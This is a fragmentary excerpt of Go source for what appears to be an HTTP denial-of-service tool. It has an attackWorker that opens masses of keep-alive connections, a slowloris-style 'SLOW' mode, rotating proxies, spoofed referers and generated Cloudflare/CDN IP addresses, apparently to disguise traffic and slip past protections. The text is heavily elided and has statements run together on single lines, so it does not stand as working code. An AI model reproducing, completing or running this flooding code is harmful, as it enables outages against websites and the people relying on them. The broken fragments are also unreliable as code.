...
var (
	...
	referers = []string{		"https://www.google.com/",
		"https://www.bing.com/",
...
func loadProxiesFromAPI() {
	...
	for _, line := range lines {
		...
		if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {			newProxies = append(newProxies, line)
		}
	}
...
func detectProvider(ip string) string {
	...
	providers := []string{"cloudflare", "hetzner", "digitalocean", "aws"}	return providers[randInt(0, len(providers)-1)]
}
...
func main() {
	...
	u, err := url.Parse(target)	if err != nil || u.Scheme == "" || u.Host == "" {
...
func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCounter, useProxy bool) {
	...
	if client == nil {
		tr := &http.Transport{
			...
			MaxIdleConns:        4000,
			MaxIdleConnsPerHost: 2000,
			IdleConnTimeout:     120 * time.Second,			DisableKeepAlives:   false,
		}
		http2.ConfigureTransport(tr)
		client = &http.Client{Transport: tr, Timeout: 0}
	}
	...
	for {
		...
		default:
			...
			if mode == "SLOW" {
				...
				go func(c net.Conn, doneChan chan struct{}) {					ticker := time.NewTicker(time.Duration(randInt(4, 12)) * time.Second)
					defer ticker.Stop()
			...
			if provider == "cloudflare" || randInt(1, 100) <= 40 {				cfIP := generateCloudflareIP()
				numCF := randInt(2, 4)
				for i := 0; i < numCF; i++ {
			...
			if randInt(1, 100) <= 30 {				numCDN := randInt(1, 2)
				for i := 0; i < numCDN; i++ {
...
func generateRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",		randInt(1, 255),
		randInt(1, 255),
		randInt(1, 255),
		randInt(1, 255),
	)
